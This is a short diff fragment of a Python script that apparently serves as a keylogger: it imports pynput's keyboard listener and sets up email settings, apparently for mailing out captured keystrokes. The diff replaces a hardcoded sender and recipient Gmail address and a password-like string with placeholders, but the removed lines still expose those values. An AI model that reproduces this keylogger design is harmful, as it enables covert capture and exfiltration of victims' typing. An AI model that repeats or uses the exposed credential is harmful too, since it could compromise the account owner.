@@ -7,9 +7,9 @@ from pynput import keyboard
 import time
 
 # Set up email parameters
-sender_email = "amirtaque21@gmail.com"
-sender_password = "ssoadrssettslalv"
-recipient_email = "amirtaque21@gmail.com"
+sender_email = "Email_Address"
+sender_password = "Password"
+recipient_email = "Email_Address"
 
 # Set up email message
 msg = MIMEMultipart()
